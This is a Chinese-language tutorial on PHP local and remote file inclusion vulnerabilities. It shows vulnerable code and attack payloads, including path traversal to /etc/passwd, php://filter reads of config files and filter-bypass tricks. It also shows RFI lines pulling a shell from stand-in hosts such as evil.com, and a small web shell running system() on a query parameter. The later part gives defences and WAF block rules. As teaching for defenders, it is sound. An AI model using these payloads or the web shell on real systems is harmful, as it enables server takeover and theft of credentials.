什麼是文件包含漏洞？

文件包含漏洞（File Inclusion Vulnerability）是 Web 應用程式中常見的安全漏洞之一。當應用程式允許使用者輸入的參數直接用於文件包含函數，而沒有進行適當的過濾和驗證時，攻擊者就可能利用這個漏洞來讀取伺服器上的敏感文件，甚至執行任意程式碼。

PHP 文件包含函數

PHP 提供了多個文件包含函數，這些都可能成為攻擊的目標：

PHP
// 主要的文件包含函數
include('file.php');      // 包含文件，找不到時發出警告但繼續執行
include_once('file.php'); // 只包含一次
require('file.php');      // 包含文件，找不到時產生致命錯誤
require_once('file.php'); // 只包含一次
漏洞類型 說明 危險程度
LFI (Local File Inclusion) 本地文件包含 - 攻擊者可以讀取伺服器上的本地文件 ⚠️ 高
RFI (Remote File Inclusion) 遠端文件包含 - 攻擊者可以包含遠端伺服器上的惡意程式碼 🔴 極高

📂 LFI - 本地文件包含漏洞

漏洞原理

LFI（Local File Inclusion）允許攻擊者讀取伺服器上的本地文件。當網站使用使用者輸入來決定要包含哪個文件時，如果沒有適當的驗證，攻擊者就可以讀取敏感資料。

❌ 存在漏洞的程式碼範例
PHP - 有漏洞
// 危險！直接使用使用者輸入
$page = $_GET['page'];
include($page . '.php');
正常請求
?page=about
→
包含文件
include('about.php')
→
✅ 正常顯示
關於我們頁面

常見的 LFI 攻擊手法

⚠️ 以下為攻擊範例，僅供教學使用

1. 路徑遍歷攻擊（Directory Traversal）

攻擊範例
// 使用 ../ 來向上移動目錄
?page=../../../../etc/passwd

// 實際執行的程式碼
include('../../../../etc/passwd.php');

// 讀取 Linux 系統的密碼文件
?page=../../../../etc/passwd%00

// %00 是空字節注入，可以截斷後面的 .php

2. 絕對路徑攻擊

攻擊範例
// 直接使用絕對路徑
?page=/etc/passwd
?page=/var/www/html/config.php
?page=/var/log/apache2/access.log

// Windows 系統
?page=C:\Windows\System32\drivers\etc\hosts
?page=C:\xampp\htdocs\config.php

3. 包裝器（Wrapper）攻擊

攻擊範例
// 使用 PHP 包裝器讀取文件
?page=php://filter/read=convert.base64-encode/resource=config.php

// 這會將 config.php 以 base64 編碼輸出，避免被執行

常見目標文件

文件路徑 內容說明 系統
/etc/passwd 使用者帳號資訊 Linux/Unix
/etc/shadow 雜湊後的密碼（需要高權限） Linux/Unix
/var/log/apache2/access.log Apache 訪問日誌 Linux/Unix
/proc/self/environ 環境變數（可能包含敏感資訊） Linux/Unix
C:\Windows\win.ini Windows 配置文件 Windows
C:\xampp\passwords.txt XAMPP 密碼文件 Windows

🌐 RFI - 遠端文件包含漏洞

漏洞原理

RFI（Remote File Inclusion）比 LFI 更危險，因為攻擊者可以包含來自遠端伺服器的惡意程式碼。這需要 PHP 設定中的 allow_url_include 選項被啟用。

⚠️ 重要說明：
  • PHP 5.2.0 之後，allow_url_include 預設為 Off
  • 即使關閉，仍然可能透過其他方式達到類似效果
  • RFI 可以直接執行任意程式碼，危險性極高
❌ 存在 RFI 漏洞的程式碼
PHP - 有漏洞
// 危險！允許包含遠端文件
$page = $_GET['page'];
include($page);

// php.ini 設定
// allow_url_include = On  ← 非常危險！

RFI 攻擊流程

1️⃣ 攻擊者準備
在自己的伺服器
建立惡意 PHP 文件
→
2️⃣ 發起攻擊
?page=http://evil.com/shell.txt
→
3️⃣ 伺服器執行
包含並執行
惡意程式碼
→
4️⃣ 🔴 伺服器被控制
獲得 Shell 權限

RFI 攻擊範例

1. 基本 RFI 攻擊

攻擊範例
// 包含遠端的惡意 PHP 文件
?page=http://attacker.com/shell.php
?page=https://pastebin.com/raw/malicious_code

// 使用 FTP 協定
?page=ftp://attacker.com/backdoor.php

// 使用 SMB 協定（Windows）
?page=\\attacker.com\share\evil.php

2. 惡意文件範例（shell.txt）

惡意程式碼範例
// 攻擊者伺服器上的 shell.txt
<?php
// 簡單的 Web Shell
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}

// 或者上傳文件功能
file_put_contents('backdoor.php', $_GET['code']);
?>

3. 繞過副檔名限制

繞過技巧
// 如果程式碼強制加上 .php
$page = $_GET['page'];
include($page . '.php');

// 攻擊者可以使用空字節注入（PHP < 5.3.4）
?page=http://evil.com/shell.txt%00

// 或使用問號（? 後面的內容會被當作查詢字串）
?page=http://evil.com/shell.txt?

// 最終執行：
include('http://evil.com/shell.txt?.php');

LFI vs RFI 比較

特性 LFI（本地文件包含） RFI（遠端文件包含）
文件來源 伺服器本地文件 遠端伺服器文件
前置條件 無特殊要求 需要 allow_url_include = On
攻擊難度 中等 較低（如果設定允許）
危險程度 高（資訊洩露） 極高（直接執行程式碼）
常見用途 讀取敏感文件、日誌注入 上傳 Webshell、完全控制伺服器

🔧 PHP Filter - 進階攻擊技巧

什麼是 PHP Filter？

PHP Filter 是 PHP 內建的一種協議包裝器（Protocol Wrapper），可以在讀取文件時對內容進行各種轉換和過濾。在安全測試中，PHP Filter 常被用於繞過某些防護機制，特別是在 LFI 攻擊中。

💡 為什麼要使用 PHP Filter？
  • 直接包含 PHP 文件會被執行，看不到原始碼
  • 使用 Filter 可以將 PHP 文件以編碼形式輸出
  • 可以繞過某些字串過濾機制
  • 支援多種編碼和轉換方式

PHP Filter 基本語法

基本語法
// 基本格式
php://filter/read=過濾器名稱/resource=文件路徑

// 完整格式
php://filter/convert.轉換類型.編碼方式/resource=目標文件

常用的 PHP Filter

1. Base64 編碼過濾器（最常用）

讀取 PHP 原始碼
攻擊範例
// 問題：直接包含 config.php 會被執行，看不到內容
?page=config.php  ← 文件被執行，無法看到原始碼

// 解決：使用 base64 編碼讀取
?page=php://filter/read=convert.base64-encode/resource=config.php

// 或使用簡寫
?page=php://filter/convert.base64-encode/resource=config.php
實際操作流程
步驟說明
// 步驟 1: 使用 filter 獲取 base64 編碼的內容
瀏覽器輸入：
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config

// 步驟 2: 取得輸出結果（base64 編碼）
輸出：PD9waHAKJGRiX2hvc3QgPSAibG9jYWxob3N0IjsKJGRiX3VzZXI...

// 步驟 3: 使用 base64 解碼工具解碼
解碼後：
<?php
$db_host = "localhost";
$db_user = "admin";
$db_pass = "P@ssw0rd123";  ← 成功讀取敏感資訊！
?>

2. ROT13 編碼過濾器

ROT13 範例
// ROT13 是一種簡單的字母替換加密
?page=php://filter/read=string.rot13/resource=config.php

// 優點：輸出仍是文字，較容易閱讀
// 缺點：只能處理字母，數字和符號不變

3. 組合多個過濾器（鏈式調用）

鏈式過濾器
// 可以使用管道符號 | 組合多個過濾器
?page=php://filter/read=string.rot13|convert.base64-encode/resource=config.php

// 執行順序：先 ROT13，再 Base64 編碼

// 實際應用：繞過關鍵字檢測
?page=php://filter/convert.iconv.utf-8.utf-16/resource=config.php

進階 PHP Filter 技巧

1. 字符編碼轉換

編碼轉換
// 使用 iconv 進行編碼轉換
php://filter/convert.iconv.utf-8.utf-16/resource=file.php
php://filter/convert.iconv.utf-8.utf-16le/resource=file.php

// 可以用來繞過某些 WAF（Web Application Firewall）
// 原理：改變字符編碼讓 WAF 無法識別惡意模式

2. 壓縮過濾器

壓縮/解壓縮
// zlib 壓縮
php://filter/zlib.deflate/resource=file.php

// zlib 解壓縮
php://filter/zlib.inflate/resource=compressed_file

// bzip2 壓縮
php://filter/bzip2.compress/resource=file.php

3. 字符串過濾器

字符串處理
// 移除標籤
php://filter/string.strip_tags/resource=file.php

// 轉換為大寫
php://filter/string.toupper/resource=file.php

// 轉換為小寫
php://filter/string.tolower/resource=file.php

PHP Filter 攻擊實戰場景

場景 1：讀取資料庫配置文件
實戰範例
// 目標：獲取資料庫帳號密碼
// 步驟 1：確認存在 LFI 漏洞
http://target.com/index.php?page=home

// 步驟 2：嘗試讀取配置文件
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config

// 步驟 3：如果加了 .php 後綴，也能讀取
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=../config

// 步驟 4：解碼 base64 輸出，獲得敏感資訊
場景 2：繞過黑名單過濾
繞過技巧
// 假設伺服器過濾了 "php://" 字串
$page = str_replace("php://", "", $_GET['page']);

// 攻擊者可以使用雙寫繞過
?page=phphp://p://filter/convert.base64-encode/resource=config

// 或使用大小寫混合（如果過濾區分大小寫）
?page=PHP://filter/convert.base64-encode/resource=config
?page=PhP://filter/convert.base64-encode/resource=config

🛡️ 防禦措施與最佳實踐

✅ 核心防禦原則：
  • 輸入驗證：永遠不要信任使用者輸入
  • 白名單機制：只允許預期的輸入值
  • 最小權限原則：限制文件訪問權限
  • 禁用危險功能：關閉不必要的 PHP 功能

1. 使用白名單驗證

✅ 安全的程式碼範例
PHP - 白名單方式
<?php
// 定義允許的頁面白名單
$allowed_pages = [
    'home',
    'about',
    'contact',
    'products'
];

// 獲取使用者輸入
$page = $_GET['page'] ?? 'home';

// 驗證是否在白名單中
if (in_array($page, $allowed_pages, true)) {
    // 安全地包含文件
    include("pages/" . $page . ".php");
} else {
    // 不在白名單中，顯示錯誤頁面
    include("pages/404.php");
}
?>

2. 過濾危險字符

PHP - 字符過濾
<?php
// 移除路徑遍歷字符
$page = $_GET['page'];

// 移除 ../ 和 ..\
$page = str_replace(['../', '..\\', '..\\' ], '', $page);

// 移除空字節
$page = str_replace("\0", '', $page);

// 只允許字母、數字、底線和連字號
if (!preg_match('/^[a-zA-Z0-9_-]+$/', $page)) {
    die("Invalid page name");
}

include("pages/" . $page . ".php");
?>

3. 使用絕對路徑和 basename()

PHP - 路徑控制
<?php
// 定義基礎目錄
$base_dir = '/var/www/html/pages/';

// 獲取使用者輸入，只保留文件名
$page = basename($_GET['page']);

// 建構完整路徑
$file_path = $base_dir . $page . '.php';

// 驗證文件是否存在且在允許的目錄內
$real_path = realpath($file_path);

if ($real_path && strpos($real_path, $base_dir) === 0 && file_exists($real_path)) {
    include($real_path);
} else {
    die("File not found");
}
?>

4. PHP 配置安全設定

php.ini 安全設定
; 禁止遠端文件包含（必須設定）
allow_url_include = Off

; 禁止使用 fopen 打開遠端文件（建議）
allow_url_fopen = Off

; 限制可訪問的目錄
open_basedir = "/var/www/html:/tmp"

; 禁用危險函數
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source

; 關閉錯誤顯示（生產環境）
display_errors = Off
log_errors = On

5. 使用安全框架

現代框架的路由系統
Laravel 路由範例
// Laravel 等現代框架使用路由而非直接文件包含
// routes/web.php

Route::get('/home', function() {
    return view('home');
});

Route::get('/about', function() {
    return view('about');
});

// 使用者無法直接控制包含哪個文件
// 所有路由都經過框架驗證

6. Web Application Firewall (WAF)

WAF 規則範例（ModSecurity）： 
# 阻擋常見的路徑遍歷攻擊
SecRule ARGS "@contains ../" "id:1,deny,status:403"

# 阻擋 PHP Filter 攻擊
SecRule ARGS "@contains php://filter" "id:2,deny,status:403"

# 阻擋遠端文件包含
SecRule ARGS "@rx (http|https|ftp)://" "id:3,deny,status:403"

完整的安全實作範例

PHP - 完整安全方案
<?php
// 完整的安全文件包含實作

class SecureFileInclude {
    private $base_dir = __DIR__ . '/pages/';
    private $allowed_pages = [
        'home', 'about', 'contact', 'products'
    ];
    
    public function includePage($page_name) {
        // 1. 設定預設值
        $page_name = $page_name ?: 'home';
        
        // 2. 白名單驗證
        if (!in_array($page_name, $this->allowed_pages, true)) {
            return $this->notFound();
        }
        
        // 3. 使用 basename 防止路徑遍歷
        $safe_name = basename($page_name);
        
        // 4. 建構完整路徑
        $file_path = $this->base_dir . $safe_name . '.php';
        
        // 5. 取得真實路徑並驗證
        $real_path = realpath($file_path);
        
        // 6. 確保文件在允許的目錄內
        if (!$real_path || strpos($real_path, $this->base_dir) !== 0) {
            return $this->notFound();
        }
        
        // 7. 確認文件存在
        if (!file_exists($real_path)) {
            return $this->notFound();
        }
        
        // 8. 安全地包含文件
        include $real_path;
    }
    
    private function notFound() {
        http_response_code(404);
        echo "Page not found";
    }
}

// 使用範例
$includer = new SecureFileInclude();
$includer->includePage($_GET['page'] ?? 'home');
?>
🎯 關鍵要點：
  • 多層防禦：不要依賴單一防禦機制
  • 預設拒絕：只允許明確被授權的操作
  • 最小權限：限制 PHP 和文件系統的權限
  • 持續監控：記錄可疑活動並定期審查
  • 定期更新：保持 PHP 和系統套件最新版本
